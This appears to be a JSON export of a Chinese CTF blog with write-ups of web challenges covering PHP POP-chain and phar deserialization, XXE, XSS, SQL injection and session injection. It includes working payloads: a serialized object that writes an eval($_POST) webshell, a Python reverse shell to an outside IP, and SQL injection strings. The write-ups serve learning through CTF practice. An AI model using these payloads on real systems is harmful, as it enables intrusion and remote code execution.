2019]EzPOP","slug":"EIS-2019-EzPOP","date":"2020-10-27T05:27:23.000Z","updated":"2020-10-30T06:28:09.540Z","comments":true,"path":"2020/10/27/EIS-2019-EzPOP/","link":"","permalink":"/2020/10/27/EIS-2019-EzPOP/","excerpt":"","text":"[EIS 2019]EzPOP我必须承认这代码我看了一遍之后没啥头绪。。。不过这种东西不知道它干啥的没关系 我们只要找敏感函数就行首先看A类的魔法函数destruct，就从这里开始分析吧。若autosave的值等于0，则触发save函数。然而save函数中有个不属于A类但是属于B类的set函数，这就很有意思了。 先假定this-&gt;store指向B类，然后跟进set函数，然而看了几行就不想跟进了。。。但是看到后面有一个file_put_contents 这应该是一个可以利用的点，name就是A类传过来的key，可控，B类中getCacheKey函数里的options数组也可控，所以文件名可控。 接下来就是看写入的内容是否可控了，即data。$data = $this-&gt;serialize($value);value就是A类传过来的content if ($this-&gt;options[‘data_compress’] &amp;&amp; function_exists(‘gzcompress’)) { //数据压缩 $data = gzcompress($data, 3); }这一段不知道是干啥的，暂且不去管 $data = $this-&gt;serialize($value);这东西乍一看以为是写入序列化过的内容，可往上一看发现定义了一个serialize函数。 $serialize = $this-&gt;options[‘serialize’];return $serialize($data); 思路A：$store 指向B$key 文件后缀名 指定就 .php$expire 没啥用$this-&gt;autosave false$this-&gt;cache 设为空$this-&gt;complete 马 B:options[‘prefix’] 文件名options[‘serialize’] 方法options[‘expire’] 没啥用options[‘data_compress’] false pop链太急了就不写了 得去跑步了 简单总结下知识点 exit（）用伪协议绕过然后 好像没有然后了这题buu上做着不难 到比赛的时候估计也是一道难题 因为会出很多细节上的问题。 payload：?src&amp;data=O%3A1%3A”A”%3A5%3A{s%3A8%3A”%00%00store”%3BO%3A1%3A”B”%3A1%3A{s%3A7%3A”options”%3Ba%3A4%3A{s%3A6%3A”prefix”%3Bs%3A50%3A”php%3A%2F%2Ffilter%2Fwrite%3Dconvert.base64-decode%2Fresource%3D”%3Bs%3A6%3A”expire”%3Bi%3A11%3Bs%3A13%3A”data_compress”%3Bb%3A0%3Bs%3A9%3A”serialize”%3Bs%3A6%3A”strval”%3B}}s%3A6%3A”%00%00key”%3Bs%3A6%3A”pz.php”%3Bs%3A9%3A”%00*%00expire”%3BN%3Bs%3A5%3A”cache”%3Ba%3A1%3A{i%3A111%3Ba%3A1%3A{s%3A4%3A”path”%3Bs%3A38%3A”PD9waHAgZXZhbCgkX1BPU1RbJ2NtZCddKTs%2FPg”%3B}}s%3A8%3A”complete”%3Bs%3A1%3A”2”%3B}","categories":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}],"tags":[],"keywords":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}]},{"title":"[GoogleCTF2019 Quals]Bnv","slug":"GoogleCTF2019-Quals-Bnv","date":"2020-10-24T13:34:35.000Z","updated":"2020-10-24T13:35:25.292Z","comments":true,"path":"2020/10/24/GoogleCTF2019-Quals-Bnv/","link":"","permalink":"/2020/10/24/GoogleCTF2019-Quals-Bnv/","excerpt":"","text":"[GoogleCTF2019 Quals]Bnv-xxe 让我们选一个离我们最近的搜索引擎 抓包发现采用JSON进行数据传输，可能存在xxe。但是在此之前 ，先重新学习一下基础知识：https://blog.csdn.net/qq_36119192/article/details/83047334 XML(Extensible Markup Language)扩展标记语言 ，是一种常用的标记语言，用于标记电子文件使其具有结构性，可以用来标记数据、定义数据类型，是一种允许用户对自己的标记语言进行定义的源语言。 XML使用 DTD(document type definition)文档类型定义来组织数据；格式统一，跨平台和语言，早已成为业界公认的标准。XML是标准通用标记语言 (SGML) 的子集，非常适合 Web 传输。XML 提供统一的方法来描述和交换独立于应用程序或供应商的结构化数据。 DTD(文档类型定义)DTD（文档类型定义）的作用是定义 XML 文档的合法构建模块。DTD 可以在 XML 文档内声明，也可以外部引用。 1：内部声明：&lt;!DOCTYPE 根元素 [元素声明] &gt; 2：外部声明（引用外部DTD）：&lt;!DOCTYPE 根元素 SYSTEM “文件名”&gt; 内外部实体又可分为 一般实体 和 参数实体 1、一般实体的声明语法：&lt;!ENTITY 实体名 “实体内容“&gt; 引用实体的方式：&amp;实体名；2、参数实体只能在DTD中使用，参数实体的声明格式： &lt;!ENTITY %实体名 “实体内容“&gt; 引用实体的方式：%实体名； 而且参数实体还能嵌套定义，但需要注意的是，内层的定义的参数实体% 需要进行HTML转义，否则会出现解析错误。 XXE常见利用方式 与SQL相似，XXE漏洞也分为有回显和无回显有回显，可以直接在页面中看到payload的执行结果或现象。无回显，又称为blind xxe，可以使用外带数据(OOB)通道提取数据。即可以引用远程服务器上的XML文件读取文件。 解题 直接转化为xml形式会提示没有找到DTD，所以需要在DTD中添加一个简单的实体。添加了简单实体后会说没有message元素的声明。加上之后就如上图所示，返回成功，我们得到了正确的响应。 接下来添加一个外部实体来发出出口请求。 我们得到一个标记错误。这意味着文件已经正确加载了，但由于它不是个格式良好的xml文件 所以它中断了。现在我们有了一种枚举文件名的方法，让我们看看是否可以找到一个标志文件。读取/flag文件也是相同回显，这意味着标志就存在路由中，然后被标记为一个文件。我们所要做的就是以某种方式来读取它。但是怎么读取呢？ Blind-XXE 引用本地DTD文件：http://yugod.xmutsec.com/index.php/2019/07/14/50.html 如果目标主机的防火墙十分严格,不允许我们请求外网服务器dtd,那么我们可以通过引入本地dtd文件实现XXE。 ubuntu系统自带/usr/share/yelp/dtd/docbookx.dtd文件 它定义了很多参数实体并调用,所以我们可以在内部重写一个该dtd文件中含有的参数实体,如ISOmaso 我们在响应中得到的文件名与错误的文件名相同，这是可以被滥用的。 首先我们读取了所需文件的内容，它可以是一个/flag，它也可以使/etc/password，然后我们可以尝试读取另一份文件，但是我们要确保第二个是个假文件名是我们刚刚读取第一份文件的内容，显然这会给我们一个错误，因为没有文件名作为第一个文件的内容，在错误中我们得到了文件的名称，我们尝试阅读那些意味着，我们也会取回第一个文件的内容，因此使用本地DTD，通过XXE读取任意文件。 晕乎乎的，看了一堆文章，不知道自己有没有搞懂。。。上面都是网上一些文章的解读，感觉没有一个讲明白的。我自己的理解是这样，首先这是一个无回显Blind XXE。由于目标主机不允许我们请求外网服务器dtd，那么我们只能借用本地的dtd文件，就像这题里面的/usr/share/yelp/dtd/docbookx.dtd（不知道是咋找到的？应该是根据系统推断的？），重写这个dtd文件里面的参数实体使之满足我们的目的，即此题中的ISOamso。首先我们读取/flag文件，该文件已经被正确加载但由于它不是个格式良好的xml文件，所以它中断了。flag的内容被保存到file变量。flag的内容被保存到file变量。flag的内容被保存到file变量。重要的事情说三遍。通过访问不存在的文件报错带出即可。就因为不清楚flag内容一开始去哪了卡了一小时没懂。。。。。 溜了溜了。","categories":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}],"tags":[],"keywords":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}]},{"title":"[CISCN2019 华东北赛区]Web2","slug":"CISCN2019-华东北赛区-Web2","date":"2020-10-22T05:36:28.000Z","updated":"2020-10-22T08:41:08.934Z","comments":true,"path":"2020/10/22/CISCN2019-华东北赛区-Web2/","link":"","permalink":"/2020/10/22/CISCN2019-华东北赛区-Web2/","excerpt":"","text":"前言到现在似乎就从来没有见过xss的题目，以至于看到这题的时候才想起来自己对xss只是略知一二。关于原理这里有一篇付费文章讲的非常不错：https://blog.csdn.net/qq_36119192/article/details/82469035 主页没啥发现，但是通过dirsearch扫到了admin.php，访问提示没有权限。 简单投稿发现我们写的内容会被显示在一个html文件里，同时反馈界面提示admin会访问我们提交的界面，再结合访问admin.php需要权限，可推出这就是xss无疑。我们需要生成一个钓鱼链接使管理员点击，获取到他的session。从而获得进入admin.php的权限。 由于buu无法访问外网，所以需要用到 http://xss.buuoj.cn 将(new Image()).src改为window.location.href，并且去掉下面if的内容（不是很清楚这一步） 由于过滤了括号，需要编写脚本转换成html markup，即&amp;#加上ascii码。 将得到的payload提交，接下来就是反馈给管理员。注意要将buu网址前面那串代码改成web，这一步我也不知道是为啥。。。有个md5的简单认证比较简单就不说了。 然后再xss平台收到反馈 成功登录进admin.php最后是一个弱智sql注入。","categories":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}],"tags":[{"name":"xss","slug":"xss","permalink":"/tags/xss/"}],"keywords":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}]},{"title":"N1CTF WP","slug":"N1CTF-WP","date":"2020-10-19T12:38:28.000Z","updated":"2020-10-19T12:44:06.640Z","comments":true,"path":"2020/10/19/N1CTF-WP/","link":"","permalink":"/2020/10/19/N1CTF-WP/","excerpt":"","text":"N1CTF WP前言差不多算是自己第一次认真的打比赛了，收获很大，见识了一堆巨佬。关于做题方面，终于不算是签到选手了。磨了七八个小时，欠了米神二十顿打才磨出了Web的SignIn。总体来说还是非常开心(?)的。 Web-SignIn 进去就是源码 反序列化，首先寻找flag的输出点：在flag类的getflag函数里，当check对象的值等于key时读取flag文件。 这个key没有任何的信息，所以肯定是要通过sql注入爆出来的。 那么我们第一步便是要通过sql注入爆出key。然而单看ip类，tostring魔法函数不仅没法触发，就算触发了也不会输出报错信息。由此我们去flag类里寻找方法。 wakeup魔法函数中对ip对象有一个判断并且有不同的回显。如果ip中有n1ctf则另ip为”welcome to n1ctf2020”并通过destruct函数进行输出。但这怎么利用呢？反观上面ip类的tostring函数，如果sql语句执行成功，则返回”your ip looks ok!”，不成功的话则返回报错信息。试想，如果让flag类的ip实例化为ip类，通过报错注入返回n1ctf，并且通过destruct有一个回显。那么是不是就实现了盲注了呢？ 思路还是很清晰的，但自己动起手来还是有一堆问题。。。 首先就是这个tostring魔法函数的触发，其实知识点都知道，一个特别简单明显的触发，但当时也不知道咋回事就是没想通。应该是感冒一直咳嗽影响我QWQ（害敢找理由？你就是菜，爬。对象和字符串的转化都会触发tostring，之前遇到好多次了，呜呜呜，可能比赛的时候脑子短路了。（爬！ if语句里就有一个转换，可以触发tostring，那么直接在construct函数里让ip对象实例化为ip类就行了。pop链如下： 这样就完成了第一步。接下来就是报错注入了。我们要让sql语句返回默认的字符串’n1ctf’，yysy这我真没想到能用exp()。这应该是深入理解sql语句的人才能想到的吧（米神yyds），我做的还是太少了。在本地进行测试： 简单解读一下，0=1时这个值永假不执行，它的值就为null。1=1时永真，但在执行后面那个exp(~’n1ctf’)的时候由于这个函数本身问题，就会报错。 insert into information(xx,xx) values(‘1’ and x=1 and exp(~’n1ctf’),’pig1’);当x=1的时候会返回n1ctf，当x=0的时候语句成功执行。 在理解了这些之后，二分法脚本就可以启动了。脚本如下： 自己写的有几个小问题记录一下（挨打1、判断的时候一开始直接写的if “welcome to n1ctf2020” in r.text…..这个写快了没想到，这串字符就在源码里面。。。。2、headers{“X-Forwarded-For”:xff1}这里面xff1不必再加引号，这个确实是个细节上的失误。3、还有个啥写外面了那个应该问题不大，只是忘改了。 爆出key之后，令check等于key提交即可获得flag。","categories":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}],"tags":[],"keywords":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}]},{"title":"1015 buu刷题","slug":"1015-buu刷题","date":"2020-10-15T04:15:42.000Z","updated":"2020-10-15T08:17:28.096Z","comments":true,"path":"2020/10/15/1015-buu刷题/","link":"","permalink":"/2020/10/15/1015-buu刷题/","excerpt":"","text":"[RootersCTF2019]I_&lt;3_Flask 进去啥都无，dir没扫出东西，网页源码也啥都无。 就这一个框，有可能是ssti，但也不知道参数是啥。gg了看了wp。居然是要用工具扫参数？？？第一次见 wdnmdpython arjun.py -u http://3f2f9ef0-8bcb-4f78-931e-7207cf1f6cd7.node3.buuoj.cn/ –get提示需要加上–stable 这应该是buu的原因 任何脚本不加时间都得429。。。python arjun.py -u http://3f2f9ef0-8bcb-4f78-931e-7207cf1f6cd7.node3.buuoj.cn/ –get –stable过一小时就能跑出参数name QAQbuu yyds我就不跑了 太慢了 比赛的时候不用加 stable sstipayload已经保存 这里就不贴了 太长 [GXYCTF2019]BabysqliV3.0晕了 这名字登陆界面其实不存在sql注入 而且就是个弱口令。。没想到 直接死在这。进去了是个上传界面首先伪协议读取源码upload.php phar反序列化 最后上传这里file_get_contents()使$uploader对象通过toString()返回$this-&gt;Filename。由于phar://伪协议可以不依赖unserialize()直接进行反序列化操作，加之$this-&gt;Filename可控，因此此处$this-&gt;Filename配合phar反序列化后，destruct()方法内eval($this-&gt;cmd);最终导致了远程代码执行。 destruct中有一个eval函数，执行的条件是token=session(user)，而token又是可控的。 然后在construct中看到上传文件的时候会返回session(user)的值，所以我们首先随便上传个txt。 得到想要的值。然后生成phar文件。","categories":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}],"tags":[],"keywords":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}]},{"title":"近期总结","slug":"近期总结","date":"2020-10-15T03:42:17.000Z","updated":"2020-10-15T03:54:48.877Z","comments":true,"path":"2020/10/15/近期总结/","link":"","permalink":"/2020/10/15/近期总结/","excerpt":"","text":"好久没更新了，从今天开始恢复更博。先说一下这么久没更新的原因，之前打了几次比赛，成绩很不好，毕竟已经做了这么多题了，不该是这种水平。于是我重新做了下之前的题目，发现大有问题。之前做题大概是抱着一种了解知识点的心态，就做完一道题的收获大概就是知道了这个知识点，没有去深究payload，去自己写脚本。到了比赛就暴露出问题了，很麻木。这个月基本上把我认为该自己写的payload全部写了一遍并做了保存，已经能够自己编写一些脚本。现在的学习也更有方向性，所以我认为这一个月没做题的选择还是正确的。还有一方面就是招新，我其实一直挺惭愧的，我看到其他19都挺兴奋的，大概是那种能带新生的感觉吧。我并没有这么想，这个月一直都很难受，觉得自己太菜不配去指导他们。自己比赛都打不好凭什么去指导他们呢。但好在现在慢慢想明白了，从今天开始努力吧，希望自己有朝一日也能成为大牛。 随便写点东西给自己，也没啥逻辑，就当作一个新的开始吧。加油。","categories":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}],"tags":[],"keywords":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}]},{"title":"[RoarCTF 2019]Simple Upload","slug":"RoarCTF-2019-Simple-Upload","date":"2020-09-14T12:36:54.000Z","updated":"2020-09-16T16:16:08.355Z","comments":true,"path":"2020/09/14/RoarCTF-2019-Simple-Upload/","link":"","permalink":"/2020/09/14/RoarCTF-2019-Simple-Upload/","excerpt":"","text":"之前写的关机的时候忘保存了全没了。。。 源码 具体过程大致如下，其中知识点第二点有误，评论已经指出。https://www.cnblogs.com/wangtanzhi/p/12257246.html ———————————————————————— 做了三天。。。。原因是脚本跑不出，懒得去研究多线程，单线程跑。要么实验室网络波动断了，那还好，可以接上次断的地方接着跑。还有就是buu容器时间到了，一下子全没了。。。还有就是上课来不及跑完。。。今天放弃脚本了，比赛的时候除非多线程跑否则这也太花时间了，看了另一个巧妙的解法。 tp3中在文件上传时会调用一个strip_tags函数，该函数会去掉文件中的html标签，也即是我们可以使用html标签来绕过check。 一秒出。。。直接心态爆炸QWQ不过这种方法能想到的话多线程应该也不是问题。菜是原罪。 单线程脚本就不贴了，全网的脚本全跑过了，没一个大佬贴的多线程的，太坏了。","categories":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}],"tags":[{"name":"thinkphp upload","slug":"thinkphp-upload","permalink":"/tags/thinkphp-upload/"}],"keywords":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}]},{"title":"[网鼎杯 2020 白虎组]PicDown","slug":"网鼎杯-2020-白虎组-PicDown","date":"2020-09-13T11:36:40.000Z","updated":"2020-09-13T11:44:56.103Z","comments":true,"path":"2020/09/13/网鼎杯-2020-白虎组-PicDown/","link":"","permalink":"/2020/09/13/网鼎杯-2020-白虎组-PicDown/","excerpt":"","text":"首先试了一下ssrf但是并没有反应。后面发现../etc/passwd 可读 1、非预期 ../flag直接出flag。 2、正常操作参考http://www.xianxianlabs.com/blog/2020/06/05/381.htmlhttps://blog.csdn.net/weixin_43610673/article/details/106196856使用../proc/self/cmdline文件查看当前进行进程执行命令 访问app.py 关键代码 这里的SECRET_KEY是通过SECRET_FILE = “/tmp/secret.txt”f = open(SECRET_FILE)SECRET_KEY = f.read().strip()os.remove(SECRET_FILE) 这里读出来的，尝试读取这个/tmp/secret.txt文件，发现不能读取成功，因为利用 os.remove(SECRET_FILE)）删除。但是，在 linux 系统中如果一个程序打开了一个文件没有关闭，即便从外部删除之后，在 /proc 这个进程的 pid 目录下的 fd 文件描述符目录下还是会有这个文件的 fd，通过这个我们即可得到被删除文件的内容。尝试之后，在/proc/self/fd/3这里读取到SECRET_FILE 然后进行python反弹shell python弹shell，其实网上都有现成的，但还是记录一下：shell=python%20-c%20%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%22174.0.233.124%22,8080));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p=subprocess.call([%22/bin/bash%22,%22-i%22]);%27","categories":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}],"tags":[],"keywords":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}]},{"title":"[SWPUCTF 2018]SimplePHP","slug":"SWPUCTF-2018-SimplePHP","date":"2020-09-13T11:30:05.000Z","updated":"2020-09-13T11:36:16.643Z","comments":true,"path":"2020/09/13/SWPUCTF-2018-SimplePHP/","link":"","permalink":"/2020/09/13/SWPUCTF-2018-SimplePHP/","excerpt":"","text":"[SWPUCTF 2018]SimplePHP–phar的反序列化做到了读取源码那一步，上传基本都试了没法绕过，反序列化也没有unserialize，不会做了。看了wp知道是phar的反序列化，之前没遇到过，还能接受QAQ。 http://932b924e-67a5-4d83-8b68-ee01c9ca4a5c.node3.buuoj.cn/file.php?file=function.phpfunction.php class.php 构造pop链首先是找使链触发得魔术方法。C1e4r类中有__destruct(), __destruct()是PHP中的析构方法，在对象被销毁时被调用，程序结束时会被自动调用销毁对象。 函数中发现了echo，那么要利用echo $this-&gt;test。 public function __destruct(){ $this-&gt;test = $this-&gt;str; echo $this-&gt;test;} show类有__toString(), __toString方法在将一个对象转化成字符串时被自动调用，比如进行echo，print操作时会被调用并返回一个字符串。 利用$this-&gt;str[‘str’]-&gt;source; public function __toString(){ $content = $this-&gt;str[‘str’]-&gt;source; return $content;} Test类有__get（） __get（）当未定义的属性或没有权限访问的属性被访问时该方法会被调用。 利用 $this-&gt;get –&gt; $this-&gt;file_get($value); –&gt;base64_encode(file_get_contents($value)); public function __get($key){ return $this-&gt;get($key); }public function get($key){ if(isset($this-&gt;params[$key])) { $value = $this-&gt;params[$key]; } else { $value = “index.php”; } return $this-&gt;file_get($value);}public function file_get($value){ $text = base64_encode(file_get_contents($value)); return $text;} 其中调用了file_get_contents($value)函数的file_get函数很重要，一般看到调用了file_get_contents就可以认为这个是pop链的结束。 public function file_get($value){ $text = base64_encode(file_get_contents($value)); return $text;} 整个pop链触发 C1e4r::destruct() –&gt; Show::toString() –&gt; Test::__get() 。 根据pop链构造exp &lt;?phpclass C1e4r{ public $test; public $str;} class Show{ public $source; public $str;}class Test{ public $file; public $params; } $c1e4r = new C1e4r();$show = new Show();$test = new Test();$test-&gt;params[‘source’] = “/var/www/html/f1ag.php”;$c1e4r-&gt;str = $show; //利用 $this-&gt;test = $this-&gt;str; echo $this-&gt;test;$show-&gt;str[‘str’] = $test; //利用 $this-&gt;str[‘str’]-&gt;source; $phar = new Phar(“exp.phar”); //.phar文件$phar-&gt;startBuffering();$phar-&gt;setStub(‘&lt;?php __HALT_COMPILER(); ? &gt;’); //固定的$phar-&gt;setMetadata($c1e4r); //触发的头是C1e4r类，所以传入C1e4r对象$phar-&gt;addFromString(“exp.txt”, “test”); //随便写点什么生成个签名$phar-&gt;stopBuffering(); ?&gt; 本地生成exp.phar，抓包改成jpg上传。 访问/uplaod/可以直接看到文件名称不用去自己拼。 包含上传的文件 得到flag。","categories":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}],"tags":[],"keywords":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}]},{"title":"[GYCTF2020]EasyThinking","slug":"GYCTF2020-EasyThinking","date":"2020-09-12T12:32:23.000Z","updated":"2020-09-12T13:49:51.609Z","comments":true,"path":"2020/09/12/GYCTF2020-EasyThinking/","link":"","permalink":"/2020/09/12/GYCTF2020-EasyThinking/","excerpt":"","text":"www.zip源码泄露看到是thinkphpV6框架，立刻网上去找现成的漏洞。 第一次找到了–ThinkPHP v6.0.x 反序列化漏洞利用 https://www.cnblogs.com/-chenxs/p/12020777.html 但试了一下这题好像不行，没有参数无法上传payload。 然后又看到了–ThinkPHP6.0 任意文件操作 http://www.secflag.com/archives/606.html 细节就不多说了，放个链接备忘：https://blog.csdn.net/mochu7777777/article/details/105160796/ 有disable_function限制，php版本7.3.11disable_function绕过exp:https://github.com/mm0r1/exploits/tree/master 修改命令为readflag，蚁剑上传，然后包含一下即可出flag。 这种都有现成的洞的题做起来实在是太爽了。","categories":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}],"tags":[],"keywords":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}]},{"title":"[NCTF2019]SQLi","slug":"NCTF2019-SQLi","date":"2020-09-12T06:07:25.000Z","updated":"2020-09-12T07:57:12.956Z","comments":true,"path":"2020/09/12/NCTF2019-SQLi/","link":"","permalink":"/2020/09/12/NCTF2019-SQLi/","excerpt":"","text":"hint.txt 获得admin的密码即可获取flag regexp 大佬的脚本： string.ascii_lowercase是小写的26个字母string.ascii_uppercase是大写的26个字母string.digits是十进制数字常数 其实是一道很简单的sql。。。被之前那道题吓怕了以为这个会很难就直接看了wp太后悔了。。。 这个脚本感觉有问题，密码是错的，应该是全小写，不知道为什么能跑出来大写？玄学问题。","categories":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}],"tags":[],"keywords":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}]},{"title":"buu知识点复习(五)","slug":"bubuu知识点复习-五","date":"2020-09-12T01:21:04.000Z","updated":"2020-09-11T13:00:06.699Z","comments":true,"path":"2020/09/12/bubuu知识点复习-五/","link":"","permalink":"/2020/09/12/bubuu知识点复习-五/","excerpt":"","text":"一、[GKCTF2020]CheckIN蚁剑连上了以后忘了咋做了flag是空的 readflag是乱码 红色的start.sh又好像没啥用。看了wp才知道要利用一个php7.3的漏洞，github上有现成的pauload：https://github.com/mm0r1/exploits/blob/master/php7-gc-bypass/exploit.php这是真没想起来。。。。 二、[GXYCTF2019]BabyUpload这道题其实很简单。。。主要是一分钟出了有点飘了不得不留一笔0.0 三、[BJDCTF2020]ZJCTF，不过如此都是php伪协议，很简单。 最后得到的一段代码。记一下关于preg_replace /e 模式下的代码执行问题https://xz.aliyun.com/t/2557 今天复习到的题都很简单，所以就记录了一点。","categories":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}],"tags":[],"keywords":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}]},{"title":"LCTF2018-bestphp's revenge","slug":"LCTF2018-bestphps-revenge","date":"2020-09-11T13:01:35.000Z","updated":"2020-09-12T02:52:22.460Z","comments":true,"path":"2020/09/11/LCTF2018-bestphps-revenge/","link":"","permalink":"/2020/09/11/LCTF2018-bestphps-revenge/","excerpt":"","text":"这题差点做睡着了，太xx难了，想了好久不知道咋下手，看wp了。源码 还有一个flag.php（其实这flag.php我都不知道怎么找到的，难道比赛的时候有提示?） 通过flag.php可以看出ssrf。既然是SSRF，那么该如何满足以下条件呢？访问127.0.0.1/flag.phpcookie可控，改成我们的php_session_id那么势必得到一个php内置类，同时其具备SSRF的能力。 1、php内置类SoapClientSOAP是webService三要素（SOAP、WSDL(WebServicesDescriptionLanguage)、UDDI(UniversalDescriptionDiscovery andIntegration)）之一：WSDL 用来描述如何访问具体的接口， UDDI用来管理，分发，查询webService ，SOAP（简单对象访问协议）是连接或Web服务或客户端和Web服务之间的接口。 其采用HTTP作为底层通讯协议，XML作为数据传送的格式。简单来讲，我们可以通过它来发送http/https请求。SoapClient类可以创建soap数据报文，与wsdl接口进行交互。简单的用法： 2、CRLF Injection漏洞CRLF是”回车+换行”（\\r\\n）的简称。在HTTP协议中，HTTPHeader与HTTPBody是用两个CRLF分隔的，浏览器就是根据这两个CRLF来取出HTTP内容并显示出来。所以，一旦我们能够控制HTTP消息头中的字符，注入一些恶意的换行，这样我们就能注入一些会话Cookie或者HTML代码，所以CRLFInjection又叫HTTPResponseSplitting，简称HRS。简单来说http请求遇到两个\\r\\n即%0d%0a，会将前半部分当做头部解析，而将剩下的部分当做体，当我们可以控制User-Agent的值时，头部可控，就可以注入crlf实现修改http请求包。 但是怎么触发反序列化呢? 3：serialize_hander处理session方式不同导致session注入看到 if(isset($_GET[name])){ $_SESSION[name] = $_GET[name];} 我们不难想到，可以将序列化内容通过$_GET[name]传入session。 首先我们可以控制session.serialize_handler,通过 /?f=session_start serialize_handler=php 这样的方式，可以指定php序列化引擎,而不同引擎存储的方式也不同 php_binary:存储方式是，键名的长度对应的ASCII字符+键名+经过serialize()函数序列化处理的值 php:存储方式是，键名+竖线+经过serialize()函数序列处理的值 php_serialize(php&gt;5.5.4):存储方式是，经过serialize()函数序列化处理的值 同时根据文章内的内容，当session反序列化和序列化时候使用不同引擎的时候，即可触发漏洞 假如我们使用php_serialize引擎时进行数据存储时的序列化，可以得到内容 $_SESSION[‘name’] = ‘sky’;a:1:{s:4:”name”;s:3:”sky”;} 而在php引擎时进行数据存储时的序列化，可以得到另一个内容 $_SESSION[‘name’] = ‘sky’;name|s:3:”sky” 那么如果我们用php引擎去解php_serialize得到的序列化，是不是就会有问题了呢？ 答案是肯定的，该文章中也介绍的很清楚 php引擎会以|作为作为key和value的分隔符，我们再传入内容的时候，比如传入 $_SESSION[‘name’] = ‘|sky‘ 那么使用php_serialize引擎时可以得到序列化内容 a:1:{s:4:”name”;s:4:”|sky”;} 然后用php引擎反序列化时，|被当做分隔符，于是 a:1:{s:4:”name”;s:4:” 被当作key sky 被当做vaule进行反序列化 于是，我们只要传入 $_SESSION[‘name’] = |序列化内容 为什么能反序列化？ 光进行反序列化肯定是不够的我们看到soapclient想要触发__call()必须要调用不可访问的方法，那我们如何在题目有限的代码里调用不可访问方法呢？ 看到这段代码 php $a = array(reset($_SESSION),’welcome_to_the_lctf2018’); call_user_func($b,$a); 这里只要覆盖$b为call_user_func即可成功触发不可访问方法。 最后总结一下思路：根据flag.php想到ssrf，所以要想办法触发ssrf，利用回调函数覆盖session序列化引擎为php_serilaze，构造SSRF的Soap类的序列化字符串配合序列化注入写入session文件，然后利用变量覆盖漏洞，覆盖掉变量b为回调函数call_user_func，此时结合回调函数调用Soap类的未知方法，触发__call方法进行SSRF访问flag.php。把flag写入session，再把session打印出来即可。 接下来开始解题。 第一次发包： 记住这里面的cookie不能用自己的，否则会504，原因不明。 第二次发包： 第三次发包：用虚构的cookie替换自己的cookie访问： 第一次见到这种类型的，人傻了。","categories":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}],"tags":[],"keywords":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}]},{"title":"一天日穿sqli-labs（伪）","slug":"一天日穿sqli-labs","date":"2020-09-08T12:34:28.000Z","updated":"2020-09-09T13:59:07.114Z","comments":true,"path":"2020/09/08/一天日穿sqli-labs/","link":"","permalink":"/2020/09/08/一天日穿sqli-labs/","excerpt":"","text":"严格意义上讲今天还剩几小时了，所以明天继续。。。之前打了一点sqli-labs，那个时候一知半解，就想着前进到下一关，也不知道自己写的是什么，所以sql注入的基础不太行。今天从头开始重新挑战，借此机会希望能深入了解并掌握sql注入。 1、Less-1单引号常规注入http://bc61289b-8ad5-4c78-bce3-b9464ef5260c.node3.buuoj.cn/Less-1/?id=0%27%20union%20select%201,group_concat(username),group_concat(password)%20from%20users%20--+ 2、Less-2数字型，其他和上面一样 3、Less-3(‘1’)型，其他一样 4、Less-4(“1”)型，其他一样 5、Less-5报错注入，ez，extracvalue，启动！Table ‘security.flag’ doesn’t exist…….一天日穿计划，失败。。。。原因是我只会一个extractvalue，这里库非常多，而extractvalue的显示位数是有限制的，实际上只显示了一个security。遇到了就来学习一下。在这里我们使用floor报错语句进行注入： 通过floor报错and (select 1 from (select count(),concat((payload),floor (rand(0)2))x from information_schema.tables group by x)a)其中payload为你要插入的SQL语句需要注意的是该语句将 输出字符长度限制为64个字符 ?id=2’ and (select 1 from (select count(),concat(((select group_concat(schema_name) from information_schema.schemata)),floor (rand(0)2))x from information_schema.tables group by x)a) –+ 页面提示我输出信息超过一行，但我们已经使用了group_concat函数，说明这里数据库名组成的字符串长度超过了64位，所以我们需要放弃group_concat函数，而使用limit 0,1来一个个输出group_concat()函数的作用：将返回信息拼接成一行显示limit 0,1 表示输出第一个数据。 0表示输出的起始位置，1表示跨度为1（即输出几个数据，1表示输出一个，2就表示输出两个）接着我们运用如下语句： and (select 1 from (select count(),concat((select schema_name from information_schema.schemata limit 0,1),floor (rand()2)) as x from information_schema.tables group by x) as a) –+ 改变 limit n,1 的n的值即可一个一个爆出 爆表： and (select 1 from (select count(),concat((select concat(table_name,’;’) from information_schema.tables where table_schema=’security’ limit 0,1),floor(rand()2)) as x from information_schema.tables group by x) as a) –+ 爆列： and (select 1 from (select count(),concat((select concat(column_name,’;’) from information_schema.columns where table_name=’users’ limit 0,1),floor(rand()2)) as x from information_schema.columns group by x) as a) –+ 爆用户名： and(select 1 from (select count(),concat((select concat(username,’: ‘,password,’;’) from security.users limit 0,1),floor(rand()2)) as x from security.users group by x) as a)–+ 简直懒死了 今天看到了才想起来floor。。。。 6、Less-6双引号 7、Less-7忘了咋做了。。。。其实这靶场设置的也不真实，比如说前面那个报错注入，输入id=1显示 youarein…..，那这数据库还有啥用。。。。本关卡提示使用file权限向服务器写入文件 试了一下，一直报错，可能是我用的buu的环境？反正不常用就跳过吧。 8、Less-8二分法 9、Less-9时间盲注 